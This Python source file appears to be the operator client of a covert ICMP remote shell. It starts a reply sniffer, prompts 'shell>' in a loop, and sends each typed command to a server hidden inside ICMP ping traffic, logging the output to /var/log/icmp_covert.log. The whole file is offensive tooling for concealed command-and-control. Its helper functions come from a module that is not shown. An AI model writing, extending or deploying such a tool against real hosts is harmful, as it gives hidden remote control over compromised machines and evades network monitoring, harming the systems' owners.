import _thread
import argparse
import time

from icmp_remote_shell.common import start_sniffing, send_one


def parse_args():
    parser = argparse.ArgumentParser(description="A simple client that communicates \n"
                                                 "with server via covert ICMP channel\n"
                                                 "sends commands and gets output back")
    parser.add_argument("host_out", help="The interface to send requests")
    parser.add_argument("host_in", help="The interface to listen replies")
    parser.add_argument("ping_delay", help="Delay between answer pings", nargs='?', type=int, default=1)
    parser.add_argument("log_file", help="File to log server answers",
                        nargs='?', type=str, default='/var/log/icmp_covert.log')
    args = parser.parse_args()
    return args


def main():
    args = parse_args()
    host_out = args.host_out
    host_in = args.host_in
    ping_delay = args.ping_delay
    log_file = args.log_file
    _thread.start_new_thread(start_sniffing, (host_in, log_file))
    time.sleep(5)
    while True:
        command = input("shell>")
        if command == "quit":
            break
        else:
            send_one(host_out, ping_delay, command)
            print("Executing Command....\n")
